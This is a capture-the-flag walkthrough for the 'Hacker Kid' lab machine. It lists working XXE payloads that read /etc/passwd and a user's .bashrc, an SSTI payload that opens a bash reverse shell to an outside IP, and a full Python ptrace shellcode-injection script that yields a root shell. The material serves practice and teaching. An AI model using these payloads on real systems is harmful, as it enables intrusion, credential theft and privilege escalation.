# Hacker Kid: 1.0.1

### Nmap Scan

```bash
PORT     STATE SERVICE REASON         VERSION
53/tcp   open  domain  syn-ack ttl 64 ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu

80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Notorious Kid : A Hacker 
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

9999/tcp open  http    syn-ack ttl 64 Tornado httpd 6.1
| http-methods: 
|_  Supported Methods: GET POST
| http-title: Please Log In
|_Requested resource was /login?next=%2F
|_http-server-header: TornadoServer/6.1
MAC Address: 00:0C:29:81:D3:3B (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

### Website

- Index Page

![website.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/website.png)

- Login Page on port 9999

![login-page.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/login-page.png)

---

### Hidden Directory

- HINT →  Source Code

![hint.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/hint.png)

```bash
/page_no
```

- First we need a list of numbers.
- Create a python script to generate  numbers

```python
# save this output in a file 
for i in range(50):
    print(i)
```

- We can use Burp-Suite or ffuf
- WE USE FFUF

```bash
ffuf -u http://192.168.163.196/?page_no=FUZZ -w output
```

- Success

![subdomain-hint.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/subdomain-hint.png)

```
Okay so you want me to speak something ?
I am a hacker kid not a dumb hacker. So i created some subdomains to return back on the server whenever i want!!
Out of my many homes...one such home..one such home for me : **hackers.blackhat.local**
```

- we need to save this domain name to /etc/hosts

![hosts-file.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/e7546f39-2e77-49b3-b3c1-9cebdb312ef1.png)

- After some time we find out subdomain name
- Found another subdomain

```bash
dig http://hackers.blackhat.local @192.168.163.196
```

![vhost.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/vhost.png)

---

### website → subdomain

![vhost-success.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/vhost-success.png)

---

### XML Injection

> GitHub Reference for XML Payload   → https://github.com/payloadbox/xxe-injection-payload-list
> 

- The Register form is vulnerable to XML Injection

> **PAYLOAD**
> 

```xml
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]>
```

![XML-injection.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/XML-injection.png)

- We know there is a user name → saket
- We can see the .bashrc file for saket

> **Payload**
> 

```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/home/saket/.bashrc">]>
```

![password-saket.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/password-saket.png)

- The bashrc file is base64 encoded
- we can use cyberchef to decode this base64

![bashrc-encode.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/bashrc-encode.png)

```
password = Saket!#$%@!!
username = admin
```

---

### Login As a saket

- We can use this above password to login as saket  → on port 9999

```
username = saket
password = Saket!#$%@!!
```

![login-success.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/70649414-413d-461a-88f9-d7bf00602c8a.png)

---

### Injection Attack

- There is a hint on the page.
- The name parameter is vulnerable to injection attack
- The name parameter is vulnerable to “SSTI”, “XSS Injection”, “HTML Injection”

```bash
{% import os %}{{ os.popen("whoami").read() }}
```

- Success in Server Side Template Injection

![SSTI.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/SSTI.png)

> **NOTE: Make sure the payload is encoded otherwise it wont work.**
> 
- get a revers shell

```bash
# change the IP to your machine IP
{%import os%}{{os.system('bash -c "bash -i >& /dev/tcp/10.176.154.65/1337 0>&1"')}}
```

![ssti-payload.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/ssti-payload.png)

> **Successfully get a Reverse Shell**
> 

![shell.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/shell.png)

![rev-shell.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/rev-shell.png)

---

### Privilege Escalation

- Run Linpeas to get more information about the target system.
- Found → python2.7

![python-suid.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/720fde40-3949-4e0d-8dc9-15fce8dc4ffe.png)

> **Reference:** https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc
> 

Python script

```bash
import ctypes
import sys
import struct

PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17

class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")
pid = int(sys.argv[1])

libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers = user_regs_struct()

libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))

print("Injecting Shellcode at: " + hex(registers.rip))

# Shellcode
shellcode = (
    "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f"
    "\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58"
    "\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97"
    "\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62"
    "\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"
)

for i in range(0, len(shellcode), 4):
    # Convert the bytes to little-endian integer
    shellcode_byte_int = struct.unpack("<I", shellcode[i:i+4].ljust(4, '\x00'))[0]
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip + i), shellcode_byte_int)

print("Shellcode Injected!!")

# Modify the instruction pointer
registers.rip += 2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

```bash
ps -eaf | grep root
```

> **NOTE: Remember the PID for apache2**
> 

```bash
# change this PID accordingly
python2.7 inject.py 970 
```

![process.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/d2095359-d44f-429b-a5af-23bc060a36c7.png)

![upload-payload.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/fa29f639-3c76-4cb4-a5e3-cf9f513fac29.png)

---

![payload-upload.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/fd4131cc-1635-426f-9938-3f2dffe26a98.png)

- Now start another netcat listening on port 5600

```bash
nc <target_IP> 5600
```

- Successfully get a root shell

![root.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/10c0c02d-fe51-438a-be31-238160478529.png)